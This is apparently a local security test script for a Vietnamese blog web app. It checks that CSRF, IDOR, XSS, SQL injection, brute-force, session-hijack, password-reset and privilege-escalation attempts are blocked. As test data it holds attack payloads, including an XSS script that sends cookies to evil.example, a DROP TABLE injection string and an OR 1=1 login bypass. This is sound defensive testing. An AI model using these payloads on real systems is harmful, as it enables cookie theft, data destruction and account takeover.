// Kiểm tra bảo mật: thử chủ động nhiều kiểu tấn công trên bản chạy thử (CHỈ trên máy, không đụng tới trang thật).
//   node --no-warnings dev/test-security.mjs
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { createD1 } from './d1.mjs';
import { listen } from './server.mjs';
import { sha256Hex } from '../functions/_lib/auth.js';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const db = createD1();
db.exec(fs.readFileSync(path.join(root, 'db/schema.sql'), 'utf8'));
const INVITE = 'ma-moi-bao-mat-' + Math.random().toString(36).slice(2);
await db.prepare('INSERT INTO invites (token_hash, role, created_at) VALUES (?, ?, ?)').bind(await sha256Hex(INVITE), 'admin', 0).run();
const { server, url } = await listen({ db });

let pass = 0; const failures = [];
function ok(cond, name, extra = '') { if (cond) pass++; else { failures.push(name + (extra ? ` -> ${extra}` : '')); console.log('  ✗ LỖI', name, extra); } }

class Client {
  jar = {};
  constructor(ip) { this.ip = ip; }
  async req(method, p, body, headers = {}) {
    const h = { origin: url, 'cf-connecting-ip': this.ip, ...headers };
    if (body !== undefined && !(body instanceof ArrayBuffer) && !(body instanceof Uint8Array)) h['content-type'] = 'application/json';
    const cookie = Object.entries(this.jar).filter(([, v]) => v).map(([k, v]) => `${k}=${v}`).join('; ');
    if (cookie) h.cookie = cookie;
    const payload = body === undefined ? undefined : (body instanceof ArrayBuffer || body instanceof Uint8Array ? body : JSON.stringify(body));
    const res = await fetch(url + p, { method, headers: h, body: payload, redirect: 'manual' });
    for (const c of res.headers.getSetCookie()) { const [kv] = c.split(';'); const i = kv.indexOf('='); this.jar[kv.slice(0, i)] = kv.slice(i + 1); }
    const text = await res.text();
    let json = null; try { json = JSON.parse(text); } catch { /* html */ }
    return { status: res.status, json, text, headers: res.headers, setCookie: res.headers.getSetCookie() };
  }
}

const PW = 'mat-khau-dai-123';
const admin = new Client('10.1.0.1'), victim = new Client('10.1.0.2'), attacker = new Client('10.1.0.3'), anon = new Client('10.1.0.4');

console.log('0. Chuẩn bị: tài khoản quản trị, nạn nhân, kẻ tấn công');
let r = await admin.req('POST', '/api/auth/register', { email: 'chu@example.com', name: 'Chủ trang', password: PW, invite: INVITE });
ok(r.status === 200, 'tạo quản trị');
r = await victim.req('POST', '/api/auth/register', { email: 'nan-nhan@example.com', name: 'Nạn nhân', password: PW });
r = await attacker.req('POST', '/api/auth/register', { email: 'ke-xau@example.com', name: 'Kẻ xấu', password: PW });
const vid = (await admin.req('GET', '/api/admin/users')).json.users.find((u) => u.email === 'nan-nhan@example.com').id;
const aid = (await admin.req('GET', '/api/admin/users')).json.users.find((u) => u.email === 'ke-xau@example.com').id;
await admin.req('PATCH', `/api/admin/users/${vid}`, { status: 'approved' });
await admin.req('PATCH', `/api/admin/users/${aid}`, { status: 'approved' });
await victim.req('POST', '/api/auth/login', { email: 'nan-nhan@example.com', password: PW });
await attacker.req('POST', '/api/auth/login', { email: 'ke-xau@example.com', password: PW });

console.log('1. CSRF: yêu cầu thay đổi dữ liệu không đến từ chính trang bị từ chối');
r = await attacker.req('POST', '/api/comments', { post_id: 1, body: 'csrf' }, { origin: 'https://ke-xau.example' });
ok(r.status === 403, 'origin lạ bị chặn ở mọi API thay đổi dữ liệu', r.status);
r = await attacker.req('POST', '/api/comments', { post_id: 1, body: 'csrf' }, { origin: '' });
ok(r.status === 403, 'thiếu origin cũng bị chặn', r.status);
r = await admin.req('PATCH', `/api/admin/users/${vid}`, { status: 'blocked' }, { origin: 'null' });
ok(r.status === 403, 'origin "null" (iframe/file ẩn) bị chặn', r.status);

console.log('2. Phân quyền: thành viên thường không làm được việc của quản trị');
r = await victim.req('GET', '/api/admin/users');
ok(r.status === 403, 'thành viên không xem được danh sách thành viên', r.status);
r = await victim.req('PATCH', `/api/admin/users/${aid}`, { status: 'blocked' });
ok(r.status === 403, 'thành viên không khóa được người khác', r.status);
r = await victim.req('POST', '/api/posts', { title: 'Bài của kẻ tấn công qua IDOR', status: 'published' });
ok(r.status === 403, 'thành viên không tạo được bài viết', r.status);
r = await victim.req('POST', `/api/admin/users/${aid}/reset`, {});
ok(r.status === 403, 'thành viên không tạo được liên kết đặt lại mật khẩu cho người khác', r.status);
r = await anon.req('GET', '/api/admin/users');
ok(r.status === 401, 'khách (chưa đăng nhập) bị chặn ở API quản trị', r.status);

console.log('3. IDOR: không đọc/sửa/xóa được dữ liệu của người khác hoặc bài nháp của người khác');
r = await admin.req('POST', '/api/posts', { title: 'Bài nháp bí mật', body: 'riêng tư', status: 'draft' });
const draftId = r.json.id, draftSlug = r.json.slug;
r = await victim.req('GET', `/bai/${draftSlug}`);
ok(r.status === 404, 'thành viên thường không xem được bài nháp qua URL', r.status);
r = await anon.req('GET', `/bai/${draftSlug}`);
ok(r.status === 404, 'khách không xem được bài nháp qua URL', r.status);
r = await victim.req('GET', `/api/posts/${draftId}`);
ok(r.status === 403, 'thành viên không gọi được API lấy chi tiết bài (kể cả bài đã đăng)', r.status);
r = await victim.req('PUT', `/api/posts/${draftId}`, { title: 'Bị chiếm quyền', status: 'published' });
ok(r.status === 403, 'thành viên không sửa được bài của chủ trang', r.status);
r = await attacker.req('POST', '/api/comments', { post_id: draftId, body: 'spam' });
ok(r.status === 404, 'không bình luận được vào bài còn là nháp (chưa đăng)', r.status);
// Bài riêng để thử xóa bình luận của người khác (không dùng lại draftId, để draftId vẫn còn là nháp cho bước 11).
const commentPost = await admin.req('POST', '/api/posts', { title: 'Bài để thử bình luận', body: 'x', status: 'published' });
const commentPostId = commentPost.json.id;
const victimComment = await victim.req('POST', '/api/comments', { post_id: commentPostId, body: 'bình luận của nạn nhân' });
const victimCommentId = (await admin.req('GET', `/bai/${commentPost.json.slug}`)).text.match(/data-del-comment="(\d+)"/)?.[1] ?? 999999999;
r = await attacker.req('DELETE', `/api/comments/${victimCommentId}`);
ok(r.status === 403 || r.status === 404, 'kẻ tấn công không xóa được bình luận không phải của mình', r.status);

console.log('4. Chèn mã (XSS) vào mọi nơi người dùng có thể gõ');
const XSS = '<script>document.location="https://evil.example/steal?c="+document.cookie</script>';
r = await admin.req('POST', '/api/posts', {
  title: XSS, excerpt: XSS, city: XSS, country: XSS, body: XSS + '\n\n![x](javascript:alert(1))\n\n[nhấn](javascript:alert(2))',
  status: 'published',
});
ok(r.status === 201, 'tạo bài để thử XSS', JSON.stringify(r.json));
const xssPage = (await anon.req('GET', `/bai/${r.json.slug}`)).text;
ok(!xssPage.includes('<script>document.location'), 'script không lọt nguyên văn vào trang bài', xssPage.includes(XSS));
ok(!/href="javascript:/i.test(xssPage) && !/src="javascript:/i.test(xssPage), 'liên kết/ảnh javascript: trong Markdown bị vô hiệu');
await victim.req('POST', '/api/comments', { post_id: r.json.id, body: XSS });
const commentsPage = (await anon.req('GET', `/bai/${r.json.slug}`)).text;
ok(!commentsPage.includes('<script>document.location'), 'script trong bình luận không lọt nguyên văn vào trang');
r = await attacker.req('POST', '/api/auth/register', { email: 'xss2@example.com', name: XSS, password: PW });
ok(r.status === 400 || r.status === 200, 'tên có script: bị từ chối hoặc được escape khi hiển thị', r.status);

console.log('5. Tải ảnh: tệp giả dạng ảnh, tệp quá lớn, HTML/JS trá hình');
const fakePng = new TextEncoder().encode('<html><script>alert(1)</script></html>');
r = await admin.req('POST', '/api/images', fakePng, { 'content-type': 'image/png' });
ok(r.status === 415, 'tệp không đúng chữ ký ảnh (dù khai content-type image/png) bị từ chối', r.status);
const svgXss = new TextEncoder().encode('<svg onload="alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>');
r = await admin.req('POST', '/api/images', svgXss, { 'content-type': 'image/svg+xml' });
ok(r.status === 415, 'SVG (có thể chứa JS) bị từ chối vì không khớp JPEG/PNG/WebP', r.status);
const big = new Uint8Array(500 * 1024); big[0] = 0xff; big[1] = 0xd8; big[2] = 0xff;
r = await admin.req('POST', '/api/images', big, { 'content-type': 'image/jpeg' });
ok(r.status === 413, 'ảnh quá 400 KB bị từ chối', r.status);
r = await victim.req('POST', '/api/images', big.slice(0, 100), { 'content-type': 'image/jpeg' });
ok(r.status === 403, 'thành viên thường không tải ảnh lên được', r.status);

console.log('6. SQL injection: ký tự đặc biệt trong mọi trường không làm hỏng truy vấn hoặc lộ dữ liệu');
const sqli = "x'; DROP TABLE users; --";
r = await admin.req('POST', '/api/posts', { title: sqli, slug: '', excerpt: sqli, city: sqli, country: sqli, body: sqli, status: 'published' });
ok(r.status === 201, 'bài với ký tự SQL đặc biệt vẫn tạo được bình thường (được tham số hóa, không phải nối chuỗi)', JSON.stringify(r.json));
r = await admin.req('GET', '/api/admin/users');
ok(r.status === 200 && r.json.users.length >= 3, 'bảng users vẫn còn nguyên sau khi gửi DROP TABLE', r.status);
r = await anon.req('POST', '/api/auth/login', { email: "' OR '1'='1", password: "' OR '1'='1" });
ok(r.status === 401, 'chèn SQL vào ô đăng nhập không bỏ qua được xác thực', r.status);

console.log('7. Giới hạn số lần thử: chặn dò mật khẩu và đăng ký hàng loạt');
const brute = new Client('10.1.0.9');
let blocked = false;
for (let i = 0; i < 25; i++) {
  const res = await brute.req('POST', '/api/auth/login', { email: 'chu@example.com', password: 'sai-' + i });
  if (res.status === 429) { blocked = true; break; }
}
ok(blocked, 'dò mật khẩu quản trị liên tục bị chặn (giới hạn theo IP)', blocked);
r = await brute.req('POST', '/api/auth/login', { email: 'chu@example.com', password: PW });
ok(r.status === 429, 'kể cả mật khẩu đúng cũng bị chặn khi đã vượt giới hạn (không có cách lách)', r.status);

console.log('8. Chiếm phiên đăng nhập: cookie không đọc được bằng JavaScript, không gửi kèm khi gọi chéo trang');
r = await victim.req('GET', '/quan-ly');
const sidCookie = (victim.jar['sid'] || victim.jar['__Host-sid']) ? Object.keys(victim.jar).find((k) => /sid/.test(k)) : null;
ok(!!sidCookie, 'có cookie phiên để kiểm tra', JSON.stringify(victim.jar));
r = await victim.req('GET', '/api/auth/me');
const setCookieHeader = (await (async () => {
  // Đăng nhập lại để đọc trực tiếp header Set-Cookie của lần đăng nhập
  const c = new Client('10.1.0.10');
  const res = await c.req('POST', '/api/auth/login', { email: 'nan-nhan@example.com', password: PW });
  return res.setCookie.join(' | ');
})());
ok(/HttpOnly/i.test(setCookieHeader), 'cookie phiên có cờ HttpOnly (JavaScript trên trang không đọc được)', setCookieHeader);
ok(/SameSite=Lax/i.test(setCookieHeader), 'cookie phiên có SameSite=Lax (không tự gửi kèm từ trang khác)', setCookieHeader);

console.log('9. Đặt lại mật khẩu: không đoán được mã, không chiếm được tài khoản người khác');
r = await attacker.req('POST', '/api/auth/reset', { token: 'ma-doan-bua-khong-ton-tai-xxxxxxxxxxxxxxxx', password: 'mat-khau-moi-123', email: 'nan-nhan@example.com' });
ok(r.status === 400, 'mã đặt lại mật khẩu sai bị từ chối (không đoán được)', r.status);
const resetReq = await admin.req('POST', `/api/admin/users/${vid}/reset`, {});
const realToken = resetReq.json.link.split('#')[1];
r = await attacker.req('POST', '/api/auth/reset', { token: realToken, password: 'bi-chiem-tai-khoan-123' });
ok(r.status === 200, 'liên kết hợp lệ dùng được (xác nhận luồng đúng)');
r = await attacker.req('POST', '/api/auth/reset', { token: realToken, password: 'dung-lai-lan-nua-123' });
ok(r.status === 400, 'liên kết chỉ dùng được một lần, dùng lại bị từ chối', r.status);
r = await (new Client('10.1.0.11')).req('POST', '/api/auth/login', { email: 'nan-nhan@example.com', password: 'bi-chiem-tai-khoan-123' });
ok(r.status === 200, '(để chứng minh rủi ro) ai cầm được liên kết là đổi được mật khẩu nạn nhân — liên kết cần được gửi riêng tư, không đăng công khai');

console.log('10. Kẻ tấn công không tự phong mình làm quản trị');
r = await attacker.req('POST', '/api/auth/register', { email: 'leo-thang@example.com', name: 'Leo thang', password: PW, role: 'admin', status: 'approved' });
ok(r.json.status !== 'approved', 'tự khai role/status khi đăng ký không có tác dụng, vẫn chờ duyệt', JSON.stringify(r.json));
r = await admin.req('GET', '/api/admin/users');
ok(!r.json.users.some((u) => u.email === 'leo-thang@example.com' && u.role === 'admin'), 'tài khoản mới không tự thành quản trị');

console.log('10b. Ảnh gắn vào bài còn là nháp: có xem được bằng cách đoán số ID không?');
const draftImg = new Uint8Array(200); draftImg[0] = 0xff; draftImg[1] = 0xd8; draftImg[2] = 0xff;
r = await admin.req('POST', `/api/images?post_id=${draftId}&caption=bi-mat`, draftImg, { 'content-type': 'image/jpeg' });
const draftImgId = r.json.id;
r = await anon.req('GET', `/api/images/${draftImgId}`);
ok(r.status === 404, 'ảnh của bài còn là nháp KHÔNG xem được khi chưa đăng (kiểm tra xem có lỗ hổng không)', r.status);
r = await attacker.req('GET', '/api/images');
ok(r.status === 403, 'thành viên thường không liệt kê được toàn bộ thư viện ảnh (kể cả ảnh của bài nháp)', r.status);

console.log('11. Tiêu đề bảo mật trên mọi phản hồi (chặn chèn khung, dò loại tệp, lộ trình giới thiệu)');
r = await anon.req('GET', '/');
const hdrs = [...r.headers.keys()].join(',');
ok(/x-frame-options/i.test(hdrs) && r.headers.get('x-frame-options') === 'DENY', 'không nhúng được trang vào iframe của trang khác');
ok(/content-security-policy/i.test(hdrs), 'có Content-Security-Policy');
ok(r.headers.get('x-content-type-options') === 'nosniff', 'trình duyệt không tự đoán loại tệp (chặn một số kiểu tấn công tải lên)');
r = await anon.req('GET', `/bai/${draftSlug}`);
ok(r.status === 404, 'URL đoán mò tới bài nháp vẫn 404 với khách');

server.close();
console.log(`\n${pass} kiểm tra đạt, ${failures.length} lỗi.`);
if (failures.length) process.exitCode = 1;
